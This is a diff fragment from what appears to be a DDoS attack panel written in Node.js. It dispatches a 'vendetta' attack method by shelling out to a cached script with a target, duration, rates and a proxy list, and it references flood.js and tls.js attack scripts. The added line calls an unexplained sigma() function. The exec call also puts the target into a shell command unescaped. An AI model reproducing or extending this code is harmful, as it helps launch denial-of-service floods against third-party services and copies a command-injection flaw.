@@ -378,6 +378,7 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
 	  } else if (methods === 'vendetta') {
        pushOngoing(target, methods, duration)
 	exec(`node ${metode} ${target} ${duration} 30 100 proxy.txt`)
+	  sigma()
 	  
 const flood = path.join(__dirname, `/lib/cache/flood.js`);
 const tls = path.join(__dirname, `/lib/cache/tls.js`);
